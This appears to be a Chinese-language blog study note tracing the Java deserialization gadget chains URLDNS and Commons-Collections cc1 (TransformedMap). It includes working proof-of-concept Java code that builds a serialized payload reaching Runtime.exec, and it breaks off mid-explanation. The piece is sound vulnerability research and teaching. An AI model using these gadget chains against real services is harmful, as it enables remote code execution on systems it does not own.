class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看图：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511195908151.png" alt="image-20210511195908151"></p>
<h3 id="HashMap-readObject"><a href="#HashMap-readObject" class="headerlink" title="HashMap.readObject()"></a>HashMap.readObject()</h3><p>看源码（跳过一些初始化操作）：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511201023679.png" alt="image-20210511201023679"></p>
<p>putVal是向Map存放Entry的操作，在放入时会计算<strong>key的hash</strong>作为转化为数组位置<strong>i</strong>的映射依据。</p>
<p><strong>DNS查询正是在计算URL类的对象的hash的过程中触发的</strong>，即<strong>hash(key)</strong>。</p>
<p>看hash()方法源码：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511201250404.png" alt="image-20210511201250404"></p>
<p>不同对象的hash计算方法是在各自的类中实现的，如果传入的key是一个URL对象，这里key.hashCode()就会调用URL类中的hashCode方法：java.net.URL#hashCode。</p>
<p>java.net.URL#hashCode 源码：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511201521952.png" alt="image-20210511201521952"></p>
<p>仔细看，用到了两个field：</p>
<blockquote>
<p><strong>transient</strong> URLStreamHandler handler;  // handler是一个transient临时类型，它不会被反序列化（但之后会用到）</p>
<p><strong>private</strong> <strong>int</strong> hashCode = -1;   //hashCode是private类型，需要手动开放控制权才可以修改。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">//如果hashCode不为-1，直接返回hashCode的值</span></span><br><span class="line">  <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">	<span class="comment">//如果hashCode为-1，直接计算handler的hashcode，并返回</span></span><br><span class="line">  hashCode = handler.hashCode(<span class="keyword">this</span>);</span><br><span class="line">  <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那就继续看handler所属的类：URLStreamHandler</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511204935728.png" alt="image-20210511204935728"></p>
<p>getHostAddress也是限制了IP地址不会解析：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511205231393.png" alt="image-20210511205231393"></p>
<img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511231600583.png" alt="image-20210511231600583" style="zoom:50%;">

<p>这里面必须提一下上面的hostAddress参数，<strong>如果 Host 字段为一个域名 , 且我们之前解析过这个域名 , 那么程序会将解析后的 IP 地址缓存到 hostAddress 参数中 , 当我们再次请求时 , 由于 hostAddress 已有值 , 就不会走完剩下的 POP Chain 了。</strong></p>
<p>继续跟，会到java.net.InetAddress#getAllByName()这个方法：</p>
<img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511232113101.png" alt="image-20210511232113101" style="zoom:50%;">

<p>进入getAllByName0:</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511232345462.png" alt="image-20210511232345462"></p>
<p><strong>总结一下到目前为止可以利用的调用链</strong>：</p>
<ol>
<li>HashMap.readObject() -&gt; HashMap.hash() </li>
<li>HashMap.hash() -&gt; URL.hashCode()</li>
<li>URL.hashCode() -&gt; URLStreamHandler.hashCode()</li>
<li>URLStreamHandler.hashCode() -&gt; URLStreamHandler.getHostAddress()</li>
<li>URLStreamHandler.getHostAddress() -&gt; InetAddress.getByName() -&gt; … -&gt; getAddressFromNameService()</li>
</ol>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>满足两个条件：</p>
<ol>
<li>为了能走到URL.hashCode()，要保证map里面存放着一个Entry，这个Entry的key满足URL类型</li>
<li>为了能走到URLStreamHandler.hashCode()，需要hashCode这个field为-1，绕过if判断</li>
</ol>
<p>往前翻PoC：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">f.set(url, <span class="number">0xdeadbeef</span>); </span><br><span class="line">hashMap.put(url, <span class="string">"rmb122"</span>);</span><br><span class="line">f.set(url, -<span class="number">1</span>);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p><strong>为什么这里首先给url的hashCode属性先设置成一个值，put到map之后，再改成另一个值？</strong></p>
<p>这里我们先做一件事，看一下之前提到的HashMap.readObject()方法：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512000356313.png" alt="image-20210512000356313"></p>
<p>这里面的s其实是ObjectInputStream对象。既然key和value都是从s.readObejct()方法出来的(之后进行了cast强转)，那我们先看一下对应的HashMap.writeObject方法：</p>
<img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512000617960.png" alt="image-20210512000617960" style="zoom:50%;">

<p>跟到internalWriteEntries方法：</p>
<img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512000702874.png" alt="image-20210512000702874" style="zoom:50%;">

<p>可以看到，分别对entry内部的key和value进行了writeObject，tab的值即HashMap中table的值，也就是横向数组。</p>
<p>想一下，如果你想向一个HashMap中存放一个entry，那么就要执行HashMap.put()方法：</p>
<p>再看一下HashMap的put方法：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511224336952.png" alt="image-20210511224336952"></p>
<p>可以看到，这里用到了HashMap.hash()方法，如果这里面的key就是URL，那么后续利用链就能接上。</p>
<p>也就是说，<strong>仅仅一次put操作，就会触发一次DNS查询</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DNSTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(your_dns_url);</span><br><span class="line">        map.put(url,<span class="number">123</span>); <span class="comment">//此时就会产生一次dns查询</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里就可以回答之前的问题：</p>
<p><strong>为什要改两次，因为我们要规避掉put操作产生的DNS查询。</strong></p>
<p>之后再改回-1，是为了可以成功触发反序列化时候的漏洞。</p>
<p>也就是这里还有一条小链：</p>
<blockquote>
<p>HashMap.put() -&gt; HashMap.hash() </p>
<p>HashMap.hash() -&gt; URL.hashCode()</p>
<p>…</p>
<p>触发DNS查询</p>
</blockquote>
<h2 id="ysoserial实现版本"><a href="#ysoserial实现版本" class="headerlink" title="ysoserial实现版本"></a>ysoserial实现版本</h2><p>十分优雅</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512003551060.png" alt="image-20210512003551060"></p>
<p>这里首先有一个SilentURLStreamHandler对象，跟进去看看：</p>
<img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512003709417.png" alt="image-20210512003709417" style="zoom:50%;">

<p>可以发现这个类其实就是继承URLStreamHandler类，并且把这两个方法改成了返回null，这样就规避了在生成payload的时候的那一次DNS查询，也就是我们之前看到的HashMap.put的那次操作。</p>
<p>这次put的时候，由于handler是SilentURLStreamHandler类，完全不会出发DNS解析，实在是妙。</p>
<h1 id="Commons-Collections"><a href="#Commons-Collections" class="headerlink" title="Commons-Collections"></a>Commons-Collections</h1><p>“不是夸你们Oracle呢，CC链确实让我们没饿死”</p>
<p>这里主要是ysoserial已经有的cc1-7漏洞，以及记录一些其他师傅们发现的。</p>
<p>cc的背景可以去看之前的<a href="https://0range228.github.io/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91commons-collections-1%20%E7%BB%84%E4%BB%B6/">文章</a>温习。</p>
<h2 id="cc1"><a href="#cc1" class="headerlink" title="cc1"></a>cc1</h2><p>条件：</p>
<ul>
<li><p><strong>cc3.1～3.2.1</strong></p>
</li>
<li><p><strong>jdk 1.7</strong>(8u71之前都可以)</p>
</li>
</ul>
<p>maven：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>预备知识：</p>
<ul>
<li><a href="https://0range228.github.io/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E9%82%A3%E7%82%B9%E4%BA%8B/">动态代理</a>，一句话总结就是：<strong>动态代理直接调用接口的方法，无需实现类</strong>。</li>
<li><a href="https://0range228.github.io/%E6%BC%AB%E8%B0%88Java%E5%8F%8D%E5%B0%84/">反射</a></li>
</ul>
<p>主流两个版本：TransformedMap，LazyMap</p>
<h3 id="TransformedMap版本"><a href="#TransformedMap版本" class="headerlink" title="TransformedMap版本"></a>TransformedMap版本</h3><p>PoC：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections1_TransformedMap_Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//1.客户端构建攻击代码</span></span><br><span class="line">        <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;"getRuntime", new Class[]&#123;&#125; &#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[]&#123;&#125; &#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"open /Applications/Calculator.app"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建Map并绑定transformerChian</span></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">"value"</span>, <span class="string">"value"</span>);</span><br><span class="line">        <span class="comment">//给予map数据转化链</span></span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line">        <span class="comment">//反射机制调用AnnotationInvocationHandler类的构造函数</span></span><br><span class="line">        Class cl = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor ctor = cl.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        <span class="comment">//取消构造函数修饰符限制</span></span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//获取AnnotationInvocationHandler类实例</span></span><br><span class="line">        Object instance = ctor.newInstance(Target<span class="class">.<span class="keyword">class</span>, <span class="title">outerMap</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc1_transformedMap.ser"</span>)));</span><br><span class="line">        fout.writeObject(instance);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc1_transformedMap.ser"</span>)));</span><br><span class="line">        <span class="comment">//服务端反序列化，触发漏洞</span></span><br><span class="line">        fin.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其他小型触发：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">Map map = <span class="keyword">new</span> HashedMap();</span><br><span class="line">Map transformedMap = TransformedMap.decorate(map,chainedTransformer,<span class="keyword">null</span>);</span><br><span class="line">map1.put(<span class="number">1</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="comment">//创建Map并绑定transformerChina</span></span><br><span class="line">Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">innerMap.put(<span class="string">"value"</span>, <span class="string">"value"</span>);</span><br><span class="line"><span class="comment">//给予map数据转化链</span></span><br><span class="line">Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line"><span class="comment">//触发漏洞</span></span><br><span class="line">Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();</span><br><span class="line"><span class="comment">//outerMap后一串东西，其实就是获取这个map的第一个键值对（value,value）；然后转化成Map.Entry形式，这是map的键值对数据格式</span></span><br><span class="line">onlyElement.setValue(<span class="string">"foobar"</span>);</span><br></pre></td></tr></table></figure>

<h4 id="利用链寻找"><a href="#利用链寻找" class="headerlink" title="利用链寻找"></a>利用链寻找</h4><p>这里我想从漏洞挖掘的角度去写，毕竟这是个老洞，我们更应该关注的是如何找到的。</p>
<p>还是那句话，上来找readObject复写点，非常多！只不过我们现在关注TransformedMap类，该类是对Java标准数据结构Map接口的一个扩展。</p>
<img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512104425592.png" alt="image-20210512104425592" style="zoom:90%;">

<p>翻看commons-collections的文档可以发现：</p>
<blockquote>
<p>该类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换(transform)方法，具体的变换逻辑由Transformer类定义，Transformer在TransformedMap实例化时作为参数传入。</p>
</blockquote>
<blockquote>
<p>举个例子获得一个TransformedMap的实例，可以通过TransformedMap.decorate()方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map tansformedMap = TransformedMap.decorate(map, keyTransformer, valueTransformer);</span><br></pre></td></tr></table></figure>

<p>可以看到三个参数，map，keyTransformer，valueTransformer</p>
</blockquote>
<p>翻译过来：<strong>当TransformedMap内的key或者value发生变化时，就会触发相应参数的Transformer的transform()方法。</strong></p>
<p>其实这句话值得引起我们的怀疑，<strong>transform参数是否可控</strong>？</p>
<p>索性去找Transformer类，发现是一个接口，只有一个transform方法，find implementation(option+cmd+B)，一共14个：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512105022662.png" alt="image-20210512105022662"></p>
<p>先看第一个，ChainedTransformer：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512113116168.png" alt="image-20210512113116168"></p>
<p>这里的iTransformer属性是一个Transformer[]数组，并且发现在ChainTransformer的transform函数中，会依次对该数组里面的transformer依次进行transform方法(不同的Transformer实现类实现的transform不同，多态)。</p>
<p>而且这里有一个细节就是：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br></pre></td></tr></table></figure>

<p>这条语句放在了一个循环里面。</p>
<p>这也就<strong>导致上一次tranform方法的结果返回值会作为下一次transform的参数</strong>，越来越有链的感觉了！</p>
<p><strong>世界线展开</strong></p>
<p>这时候我们可以寻找invoke函数的调用点。</p>
<p>其实这里我认为我们始终离不开找invoke这样的sink点环节，碰巧发现在InvokeTransformer有invoke方法的使用：</p>
<img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512105446730.png" alt="image-20210512105446730" style="zoom:90%;">

<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512105544347.png" alt="image-20210512105544347"></p>
<p>哦这熟悉的反射味道，血压拉满！</p>
<p>如果这里input是可控的，按逻辑走，会获得input的Class对象，下一步想获取method对象，但是发现有两个参数iMethodName和iParamTypes。</p>
<p>往前翻构造函数：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512110405704.png" alt="image-20210512110405704"></p>
<p><strong>InvokerTransformer类就是今天的主角，因为他有RCE触发点。</strong></p>
<p>InvokerTransformer这部分我们先按下不表，接下来就要寻找哪些方法可以调用InvokerTransformer类呢？逃不开之前找到的14个Transformer，因为他们实现了Transformer这个接口，都现实了transform方法。</p>
<p>我们接下来要找transform方法在哪被调用了：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512114920825.png" alt="image-20210512114920825"></p>
<p>看TransformedMap内部：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512115236996.png" alt="image-20210512115236996"></p>
<p>只有这三处调用了transform方法。</p>
<p>前两个都是本类方法，但是第三个checkSetValue方法是一个抽象方法，属于AbstractInputCheckedMapDecorator的抽象方法，它一共有两个类实现，TransformedMap算一个：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512115852020.png" alt="image-20210512115852020"></p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512120730684.png" alt="image-20210512120730684"></p>
<p>查找checkSetValue方法在哪可以被调用，发现在内部类MapEntry的setValue方法中调用了：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512134704165.png" alt="image-20210512134704165"></p>
<p>也就是说，<strong>只要一个类A继承了抽象类AbstractInputCheckedMapDecorator，那么A就会有内部类A.MapEntry，就可以A.MapEntry.setValue()执行方法。</strong></p>
<p><strong>我们的TransformedMap就是这样的一个A</strong></p>
<p>寻找实现AbstractInputCheckedMapDecorator的类，一共有4个：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512195129400.png" alt="image-20210512195129400"></p>
<p>正好TransformedMap算一个。所以它既是readObejct复写点又是执行链的起点</p>
<p><strong>世界线收束</strong></p>
<h4 id="构造PoC"><a href="#构造PoC" class="headerlink" title="构造PoC"></a>构造PoC</h4><p>经典一句话，弹计算器：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="string">"open /Applications/Calculator.app"</span>);</span><br></pre></td></tr></table></figure>

<p>反射写法：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">"java.lang.Runtime"</span>); </span><br><span class="line">clazz.getMethod("exec", String.class).invoke(clazz.getMethod("getRuntime").invoke(clazz), "open /Applications/Calculator.app");</span><br></pre></td></tr></table></figure>

<p>不清楚的可以看之前的<a href="https://0range228.github.io/%E6%BC%AB%E8%B0%88Java%E5%8F%8D%E5%B0%84/">博客</a></p>
<p>那现在要如何构造这句话呢？</p>
<p>首先上一部分我们发现了InvokerTransformer有invoke触发点，用反射来出发。</p>
<p>重要的是每个参数如何对应赋值，看InvokerTransformer的第二个构造方法：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512142534887.png" alt="image-20210512142534887"></p>
<p>我们“一句话”到执行函数是exec，回去看看：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512142625801.png" alt="image-20210512142625801"></p>
<p>exec的参数类型是String，所以InvokerTransformer构造函数的三个参数分别是：</p>
<ul>
<li>methodName = “exec” =&gt; iMethodName</li>
<li>paramTypes = “new Class[]{String.class}” =&gt; iParamtypes</li>
<li>iArgs = “new String[]{“open /Applications/Calculator.app”}” =&gt; iArgs</li>
</ul>
<p>所以尝试写一个demo1.0：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        InvokerTransformer it = <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">                <span class="string">"exec"</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[]&#123;String<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">                new String[]&#123;"open /Applications/Calculator.app"&#125;</span><br><span class="line">        );</span><br><span class="line">        <span class="comment">//得到Runtime.getRuntime()实例input</span></span><br><span class="line">        Object input = Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>).invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//为了能触发exec.invoke(input,"cmd"),需要执行transform方法</span></span><br><span class="line">        it.transform(input);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>问题来了，不会有人可以写好一个input在代码中等你，所以input需要写进payload。</p>
<p>所以接下来我们要去找：<strong>哪些类可以把input塞进去</strong>？</p>
<p>由于这里input依赖了反射，所以我们最好在jar包里找到一个invoke的复写点，直接全局搜invoke，发现只有InvokerTransformer自己。</p>
<p>所以这里<strong>我们需要将input拆开，为了依赖不同的组件</strong>。</p>
<p>想法就是既然你ChainedTransformer的transform可以<strong>循环调用</strong>Transformer数组内的不同tranform方法，那么我们也去找若干个Transformer来将input分别承担。</p>
<p>首先我们感觉肯定是越简单越好，最好是直接出现一个Transformer可以直接返回一个Runtime.getRuntime()</p>
<p>这样第二步直接new InvokerTransformer()就可以了：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"open /Applications/Calculator.app"&#125;)</span><br></pre></td></tr></table></figure>

<p>相当于：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().invoke(method(exec),<span class="string">"open /Applications/Calculator.app"</span>)</span><br></pre></td></tr></table></figure>

<p>寻找Transformer的实现类14个：</p>
<img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512150641804.png" alt="image-20210512150641804" style="zoom:80%;">

<p>我们只想要一个Transformer帮我们承担Runtime.getRuntime()即可，其他最好什么都不做。</p>
<p>发现ConstantTransformer最合适：</p>
<img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512150729223.png" alt="image-20210512150729223" style="zoom:80%;">

<p>完全都是简单的传递。</p>
<p>所以这时候demo2.0出现了：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="comment">//以下两个语句等同,一个是通过反射机制得到，一个是直接调用得到Runtime实例</span></span><br><span class="line">                <span class="comment">// new ConstantTransformer(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"))),</span></span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.getRuntime()),</span><br><span class="line">                new InvokerTransformer("exec", new Class[] &#123;String.class&#125;, new Object[] &#123;"open /Applications/Calculator.app"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        transformerChain.transform(<span class="keyword">null</span>);<span class="comment">//触发ChainedTransformer里面每一个人的transform</span></span><br></pre></td></tr></table></figure>

<p>但是这版本仅仅在本地可以测试，因为Runtime类没有实现Serializable接口，所以无法传输。</p>
<p>所以我们就需要反序列化那一端机器的Runtime实例。</p>
<p>继续拆分：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">  							<span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>)，//先得到<span class="title">Class</span>对象，<span class="title">Class</span>支持<span class="title">Serializable</span></span></span><br><span class="line">                new ConstantTransformer("getRuntime",new Class[]&#123;&#125;,new Object[]&#123;&#125;),//得到getRuntime方法对象</span><br><span class="line">                new InvokerTransformer("exec", new Class[] &#123;String.class&#125;, new Object[] &#123;"open /Applications/Calculator.app"&#125;)//将这个方法对象套在exec上</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure>

<p>讲道理这样是可以的，但是实际上还是不行：</p>
